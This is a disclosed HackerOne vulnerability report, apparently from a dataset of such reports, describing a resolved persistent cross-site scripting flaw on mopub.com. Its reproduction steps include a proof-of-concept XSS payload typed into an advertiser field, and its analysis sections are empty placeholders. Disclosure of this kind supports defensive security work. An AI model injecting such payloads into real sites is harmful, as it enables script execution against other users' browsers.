---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '15356'
original_report_id: '15356'
title: XSS ON MOPUB.COM
weakness: Cross-site Scripting (XSS) - Generic
team_handle: x
created_at: '2014-06-06T18:18:45.606Z'
disclosed_at: '2014-08-15T17:25:47.369Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 3
tags:
- hackerone
- cross-site-scripting-xss-generic
---

# XSS ON MOPUB.COM

## Metadata

- HackerOne Report ID: 15356
- Weakness: Cross-site Scripting (XSS) - Generic
- Program: x
- Disclosed At: 2014-08-15T17:25:47.369Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

PERSITENT XSS ON MOPUB.COM
STEPS TO REPRODUCE:
1. go to order
2. type in the advertiser "><img src=x onerror=prompt(document.domain)> and then press tab
3. PAYLOAD RUNS.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
